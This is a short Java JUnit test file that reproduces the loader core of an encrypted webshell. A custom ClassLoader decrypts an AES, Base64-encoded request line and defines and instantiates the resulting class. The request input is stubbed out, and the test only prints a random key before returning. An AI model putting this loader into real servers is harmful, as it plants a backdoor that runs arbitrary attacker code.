package com.zipper.xff;

import org.junit.Test;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.util.UUID;

/**
 * @author peng0806@foxmail.com <br>
 * Date: 2020/09/18.
 */
public class TestAA {
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }

        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }

    @Test
    public void get() {

        try {

            String pass = "";
            String lines = getLine();
            String pageContext = "";
            String k = null;
            if (pass != null) {
                k = ("" + UUID.randomUUID()).replace("-", "").substring(16);
                System.out.println(k);
                return;
            }
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec((k + "").getBytes(), "AES"));
            new U(this.getClass().getClassLoader())
                    .g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(lines)))
                    .newInstance()
                    .equals(pageContext);

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private String getLine() {
//        return request.getReader().readLine();
        return "line";
    }
}
